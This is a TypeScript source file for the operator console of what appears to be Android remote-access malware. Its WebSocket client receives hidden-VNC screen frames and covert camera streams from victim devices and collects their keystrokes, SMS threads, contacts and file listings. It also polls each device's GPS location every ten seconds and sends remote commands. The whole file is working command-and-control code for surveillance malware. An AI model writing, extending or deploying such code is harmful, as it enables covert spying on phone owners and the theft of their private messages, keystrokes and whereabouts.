/**
 * wsService.ts — Operator WebSocket client
 *
 * Binary frame protocol (1-byte prefix from device):
 *   0x01  HVNC frame (JPEG)
 *   0x02  Camera frame (JPEG)
 *   0x00  Raw (legacy, treat as HVNC)
 *
 * Connection state machine:
 *   IDLE → CONNECTING → CONNECTED → RECONNECTING → CONNECTING ...
 *
 * Guarantees:
 *   - Commands queued offline, flushed on reconnect (max 5s stale age)
 *   - Subscribed device re-subscribed automatically on reconnect
 *   - Ping/pong every 5s; 10s timeout forces reconnect
 *   - Exponential backoff 1s → 30s cap
 *   - perMessageDeflate disabled for binary paths (JPEG already compressed)
 */

import { useStore } from '../store/useStore';
import type { Device, KeylogEntry, LocationPoint, SmsThread, Contact, FileEntry } from '../types';

/* ── Public type ───────────────────────────────────────────── */
export type ConnState = 'idle' | 'connecting' | 'connected' | 'reconnecting';

interface QueuedCommand {
  deviceId: string;
  command:  string;
  params:   Record<string, unknown>;
  ts:       number;
}

/* ── Module state ──────────────────────────────────────────── */
let socket:           WebSocket | null = null;
let state:            ConnState        = 'idle';
let token:            string           = '';
let reconnectTimer:   ReturnType<typeof setTimeout>  | null = null;
let pingTimer:        ReturnType<typeof setInterval> | null = null;
let pingTimeoutTimer: ReturnType<typeof setTimeout>  | null = null;
let pingTs:           number = 0;
let attempt:          number = 0;
let subscribedDevice: string | null = null;
let locationPollTimer: ReturnType<typeof setInterval> | null = null;

const cmdQueue: QueuedCommand[] = [];
const CMD_MAX_AGE_MS  = 5_000;
const CMD_QUEUE_MAX   = 64;
const rttSamples:    number[] = [];

// Per-session frame counters (reset on subscribeDevice)
let lastHvncTs = 0; let hvncFps = 0; let hvncFrames = 0; let hvncBytes = 0;
let lastCamTs  = 0; let camFps  = 0; let camFrames  = 0;

/* ── Public API ────────────────────────────────────────────── */

export function connect(authToken: string): void {
  token = authToken;
  if (state === 'connecting' || state === 'connected') return;
  doConnect();
}

export function disconnect(): void {
  token   = '';
  attempt = 0;
  clearReconnect();
  stopPing();
  stopLocationPoll();
  state = 'idle';
  socket?.close(1000, 'operator disconnect');
  socket = null;
  useStore.getState().setWsConnected(false);
  useStore.getState().setConnState('idle');
}

export function sendCommand(
  deviceId: string,
  command:  string,
  params:   Record<string, unknown> = {}
): void {
  const msg = JSON.stringify({ type: 'command', deviceId, command, params });
  if (socket?.readyState === WebSocket.OPEN) {
    socket.send(msg);
  } else {
    if (cmdQueue.length >= CMD_QUEUE_MAX) cmdQueue.shift();
    cmdQueue.push({ deviceId, command, params, ts: Date.now() });
  }
}

export function subscribeDevice(deviceId: string): void {
  subscribedDevice = deviceId;
  // Reset per-device session stats
  lastHvncTs = 0; hvncFps = 0; hvncFrames = 0; hvncBytes = 0;
  lastCamTs  = 0; camFps  = 0; camFrames  = 0;
  sendRaw({ type: 'subscribe', deviceId });
  startLocationPoll(deviceId);
}

export function unsubscribeDevice(deviceId: string): void {
  if (subscribedDevice === deviceId) subscribedDevice = null;
  sendRaw({ type: 'unsubscribe', deviceId });
  stopLocationPoll();
}

export function getConnState(): ConnState { return state; }
export function getAvgRtt(): number {
  if (!rttSamples.length) return 0;
  return Math.round(rttSamples.reduce((a, b) => a + b, 0) / rttSamples.length);
}

/* ── Location polling ──────────────────────────────────────── */
const LOCATION_POLL_MS = 10_000;  // request location every 10 seconds

function startLocationPoll(deviceId: string): void {
  stopLocationPoll();
  sendCommand(deviceId, 'GET_LOCATION');   // immediate first request
  locationPollTimer = setInterval(() => {
    sendCommand(deviceId, 'GET_LOCATION');
  }, LOCATION_POLL_MS);
}

function stopLocationPoll(): void {
  if (locationPollTimer) { clearInterval(locationPollTimer); locationPollTimer = null; }
}

/* ── Internal connection ───────────────────────────────────── */

function doConnect(): void {
  clearReconnect();
  setState('connecting');
  try {
    socket = new WebSocket(buildWsUrl());
    socket.binaryType = 'arraybuffer';
  } catch (err) {
    console.error('[ws] create failed:', err);
    scheduleReconnect();
    return;
  }
  socket.onopen    = onOpen;
  socket.onmessage = onMessage;
  socket.onclose   = onClose;
  socket.onerror   = onError;
}

function onOpen(): void {
  attempt = 0;
  setState('connected');
  startPing();

  if (subscribedDevice) {
    sendRaw({ type: 'subscribe', deviceId: subscribedDevice });
    startLocationPoll(subscribedDevice);
  }

  // Flush queued commands, discard stale
  const now = Date.now();
  cmdQueue
    .filter(c => now - c.ts < CMD_MAX_AGE_MS)
    .forEach(({ deviceId, command, params }) =>
      socket!.send(JSON.stringify({ type: 'command', deviceId, command, params }))
    );
  cmdQueue.length = 0;
}

function onMessage(ev: MessageEvent): void {
  if (ev.data instanceof ArrayBuffer) {
    handleBinary(new Uint8Array(ev.data));
    return;
  }
  let msg: Record<string, unknown>;
  try { msg = JSON.parse(ev.data as string) as Record<string, unknown>; }
  catch { return; }
  handleText(msg);
}

function onClose(ev: CloseEvent): void {
  stopPing();
  stopLocationPoll();
  socket = null;
  if (ev.code === 1000 || state === 'idle') { setState('idle'); return; }
  setState('reconnecting');
  scheduleReconnect();
}

function onError(_ev: Event): void { /* onclose always follows */ }

/* ── Binary frame fast-path ────────────────────────────────── */

function handleBinary(raw: Uint8Array<ArrayBuffer>): void {
  const store = useStore.getState();
  const now   = Date.now();

  // Read 1-byte frame type prefix
  // 0x01 = HVNC, 0x02 = Camera, 0x00 / unknown = HVNC (legacy)
  let frameType = raw[0];
  let payload   = raw;

  // Detect: if first two bytes are JPEG SOI marker (0xFF 0xD8) — legacy, no prefix
  if (raw[0] === 0xFF && raw[1] === 0xD8) {
    frameType = 0x01;
    payload   = raw;
  } else {
    payload = new Uint8Array(raw.slice(1));
  }

  if (frameType === 0x02) {
    // Camera frame
    const elapsed = lastCamTs ? now - lastCamTs : 0;
    camFps = elapsed > 0 ? Math.round(1000 / elapsed) : 0;
    lastCamTs = now;
    camFrames++;
    store.setCameraFrame(payload);
    store.setCamera({ active: true, fps: camFps, frameCount: camFrames });
  } else {
    // HVNC frame (0x01 or legacy 0x00)
    const elapsed = lastHvncTs ? now - lastHvncTs : 0;
    hvncFps = elapsed > 0 ? Math.round(1000 / elapsed) : 0;
    lastHvncTs = now;
    hvncFrames++;
    hvncBytes += payload.byteLength;
    store.setHvncFrame(payload);
    store.setHvnc({ fps: hvncFps, frameCount: hvncFrames, bytesSent: hvncBytes });
  }
}

/* ── Text message dispatcher ───────────────────────────────── */

function handleText(msg: Record<string, unknown>): void {
  const store = useStore.getState();

  switch (msg['type'] as string) {
    case 'device_list':
      store.setDevices(msg['devices'] as Device[]);
      break;

    case 'device_update':
      store.upsertDevice(msg['device'] as Device);
      break;

    case 'device_disconnected':
      store.removeDevice(msg['deviceId'] as string);
      break;

    case 'keylog':
      store.addKeylog(msg['entry'] as KeylogEntry);
      break;

    case 'location': {
      const pt: LocationPoint = {
        lat:      Number(msg['lat']),
        lon:      Number(msg['lon']),
        acc:      Number(msg['acc']  ?? 0),
        ts:       Number(msg['ts']   ?? Date.now()),
        deviceId: String(msg['deviceId'] ?? subscribedDevice ?? ''),
        speed:    msg['speed']   !== undefined ? Number(msg['speed'])   : undefined,
        bearing:  msg['bearing'] !== undefined ? Number(msg['bearing']) : undefined,
      };
      if (pt.lat && pt.lon) store.addLocation(pt);
      break;
    }

    case 'sms_list': {
      const deviceId = String(msg['deviceId'] ?? '');
      const threads = msg['threads'] as SmsThread[] ?? [];
      store.setSmsThreads(deviceId, threads);
      break;
    }

    case 'contacts_list': {
      const deviceId = String(msg['deviceId'] ?? '');
      store.setContacts(deviceId, msg['contacts'] as Contact[] ?? []);
      break;
    }

    case 'file_list': {
      const deviceId = String(msg['deviceId'] ?? '');
      const path     = String(msg['path']     ?? '/');
      store.setFileListing(deviceId, path, msg['files'] as FileEntry[] ?? []);
      break;
    }

    case 'camera_frame': {
      // Fallback: camera frame as base64 JSON (for APKs that don't use binary prefix)
      const b64 = String(msg['data'] ?? '');
      if (b64) {
        const binary = atob(b64);
        const bytes  = new Uint8Array(binary.length);
        for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
        handleBinary(new Uint8Array([0x02, ...bytes]));
      }
      break;
    }

    case 'pong': {
      if (pingTimeoutTimer) { clearTimeout(pingTimeoutTimer); pingTimeoutTimer = null; }
      const rtt = Date.now() - pingTs;
      rttSamples.push(rtt);
      if (rttSamples.length > 10) rttSamples.shift();
      store.setServerPing(rtt);
      break;
    }

    case 'error':
      store.addToast({ type: 'error', message: String(msg['message'] ?? 'Server error'), duration: 4000 });
      break;

    case 'build_status':
      store.setBuildStatus(msg['status'] as never);
      break;

    default: break;
  }
}

/* ── Heartbeat ─────────────────────────────────────────────── */
const PING_MS      = 5_000;
const PING_TIMEOUT = 10_000;

function startPing(): void {
  stopPing();
  pingTimer = setInterval(() => {
    if (socket?.readyState !== WebSocket.OPEN) return;
    if (pingTimeoutTimer) { clearTimeout(pingTimeoutTimer); pingTimeoutTimer = null; }
    pingTs = Date.now();
    socket.send(JSON.stringify({ type: 'ping' }));
    pingTimeoutTimer = setTimeout(() => {
      console.warn('[ws] ping timeout — reconnecting');
      socket?.close(4000, 'ping timeout');
    }, PING_TIMEOUT);
  }, PING_MS);
}

function stopPing(): void {
  if (pingTimer)        { clearInterval(pingTimer);        pingTimer = null; }
  if (pingTimeoutTimer) { clearTimeout(pingTimeoutTimer);  pingTimeoutTimer = null; }
}

/* ── Reconnect backoff ─────────────────────────────────────── */
function scheduleReconnect(): void {
  if (reconnectTimer || !token) return;
  const delay = Math.min(1_000 * 2 ** attempt, 30_000);
  attempt++;
  reconnectTimer = setTimeout(() => { reconnectTimer = null; if (token) doConnect(); }, delay);
}
function clearReconnect(): void {
  if (reconnectTimer) { clearTimeout(reconnectTimer); reconnectTimer = null; }
}

/* ── Helpers ───────────────────────────────────────────────── */
function setState(next: ConnState): void {
  state = next;
  useStore.getState().setConnState(next);
  useStore.getState().setWsConnected(next === 'connected');
}
function sendRaw(obj: unknown): void {
  if (socket?.readyState === WebSocket.OPEN) socket.send(JSON.stringify(obj));
}
function buildWsUrl(): string {
  const env = import.meta.env['VITE_WS_URL'] as string | undefined;
  if (env) return `${env}?token=${encodeURIComponent(token)}`;
  const proto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
  return `${proto}//${window.location.host}/ws/operator?token=${encodeURIComponent(token)}`;
}
